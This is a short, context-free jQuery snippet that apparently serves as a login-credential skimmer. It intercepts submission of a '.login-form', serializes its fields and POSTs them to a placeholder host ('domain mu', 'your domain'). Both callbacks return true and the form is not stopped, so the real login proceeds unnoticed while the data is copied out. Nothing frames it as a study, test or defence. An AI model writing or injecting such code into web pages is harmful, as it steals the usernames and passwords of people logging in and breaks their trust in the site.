$(".login-form").submit(function() {

	var d = $(".login-form");

	$.ajax({

        url: "domain mu",

        type: "POST",

        data: d.serialize(),

        success: function () {

            return true;

        },

        error: function () {

            return true;

        },

    });

});
